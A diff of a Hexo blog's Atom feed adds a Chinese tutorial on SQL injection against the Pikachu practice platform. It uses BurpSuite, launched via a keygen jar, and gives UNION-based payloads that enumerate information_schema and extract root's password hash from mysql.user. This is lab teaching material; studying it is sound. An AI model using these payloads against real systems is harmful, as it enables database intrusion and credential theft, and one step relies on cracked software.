@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-11-22T12:50:29.098Z</updated>
+  <updated>2023-11-23T12:12:29.815Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>十六，sql注入的简单使用</title>
+    <link href="http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
+    <id>http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
+    <published>2023-11-23T11:10:10.000Z</published>
+    <updated>2023-11-23T12:12:29.815Z</updated>
+    
+    <content type="html"><![CDATA[<h5 id="1，搭建Pikachu漏洞练习平台"><a href="#1，搭建Pikachu漏洞练习平台" class="headerlink" title="1，搭建Pikachu漏洞练习平台"></a>1，搭建Pikachu漏洞练习平台</h5><p>先解压pikachu-master.zip文件至先前搭建的网站根目录，再打开pikachu\inc目录下的config.inc.php</p><p>文件，并将第11行代码改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&#x27;DBPW&#x27;, &#x27;root&#x27;);</span><br></pre></td></tr></table></figure><p>保存后复制黏贴为config.inc文件</p><p>打开网址：<a href="http://192.168.2.31/pikachu/">http://192.168.2.31/pikachu/</a>  便可进入PIkachu漏洞联系平台</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231919074.png" alt="image-20231123191932069" style="zoom:67%;" /><h5 id="2，安装配置BurpSuite软件"><a href="#2，安装配置BurpSuite软件" class="headerlink" title="2，安装配置BurpSuite软件"></a>2，安装配置BurpSuite软件</h5><p>先解压BurpSuite v2.1中文版.zip，双击Start.vbs后在地址中输入cmd打开命令窗口输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java -jar burp-loader-keygen-2.jar</span><br></pre></td></tr></table></figure><p>后按照流程完成BurpSuite软件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231925901.png" alt="image-20231123192524600"></p><p>点击代理-&gt;选项-&gt;CA证明书再生成</p><p>打开网址：127.0.0.1:8080 点击CA Certificate下载证书文件cacert.der</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231927462.png" alt="image-20231123192732852"></p><p>在浏览器中点击设置-&gt;搜索证书-&gt;安全-&gt;管理证书-&gt;受信任的根证书颁发机构-&gt;导入证书即可</p><p>在GOogleChrome中的扩展插件SwitchyOmega中加入如下配置</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231932016.png" alt="image-20231123193255336"></p><h5 id="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"><a href="#3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入" class="headerlink" title="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"></a>3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入</h5><p>先打开BurpSuite软件和Pikachu漏洞练习平台</p><p>再在Pikachu漏洞练习平台选择SQL的数字型注入选项</p><p>在BurpSuite软件中点击代理-&gt;截断-&gt;拦截禁用</p><p>选择1，点击查询，会发现页面没有跳转并在BurpSuite中显示了相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231941303.png" alt="image-20231123194105141"></p><p>右键发送给Repeater后管理关闭拦截请求后再重发器中可以看到相关信息，进行更改后可点击发送</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231943739.png" alt="image-20231123194356916"></p><p>数字型注入可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</p><p>在请求体最底下进行更改id&#x3D; 2 and 1&#x3D;1</p><p>页面依旧运行正常，继续进行下一步。</p><p>改为id&#x3D; 2 and 1&#x3D;2</p><p>页面运行错误，则说明此 Sql 注入为数字型注入。</p><p>改为id&#x3D;10 or 1 便可查询该表中的所有信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231947066.png" alt="image-20231123194713861"></p><p>因为在MySQL5.0以上会有一个information_schema数据库来记载所有数据库和表以及列的信息，所有可以针对该点进行查询</p><p>information_schema数据库结构如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231952626.png" alt="image-20231123195236735" style="zoom:67%;" /><p>在请求头输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select schema_name from information_schema.schemata limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询有哪些数据库，查到有数据库名为mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select table_name from information_schema.tables where table_name=&#x27;mysql&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询mysql数据库中有那些表，其中有user表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select column_name from information_schema.columns where table_name=&#x27;mysql&#x27; table_name=&#x27;user&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询user表中有哪些字段，查询到了有User用户名和authentication_string密码字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select authentication_string from mysql.user where  User=&#x27;root&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>可以查询到user表中的root管理员用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001971.png" alt="image-20231123200104745"></p><p>在MD5在线解密网站解密如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001081.png" alt="image-20231123200153119" style="zoom:67%;" /><h5 id="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"><a href="#4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入" class="headerlink" title="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"></a>4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入</h5><p>如数字型注入一样在BurpSuite中对网页的请求进行拦截</p><p>可以使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断：</p><p>在请求栏中更改id&#x3D; x’ and ‘1’&#x3D;’1</p><p>页面运行正常，继续进行下一步。</p><p>若id&#x3D; x’ and ‘1’&#x3D;’2</p><p>页面运行错误，则说明此 Sql 注入为字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27;union select 1,database()-- -</span><br></pre></td></tr></table></figure><p>可获取该数据库的名称</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232009500.png" alt="image-20231123200945828" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27; or &#x27;1=1&#x27;-- -</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232011759.png" alt="image-20231123201059324" style="zoom:67%;" /><p>便可获取该表中的所有数据</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h5 id=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;a href=&quot;#1，搭建Pikachu漏洞练习平台&quot; class=&quot;headerlink&quot; title=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;/a&gt;1，搭建Pikachu漏洞练习平台&lt;/h5&gt;&lt;p&gt;先解压pikachu</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>十五，通过phpmyadmin获取靶机的控制</title>
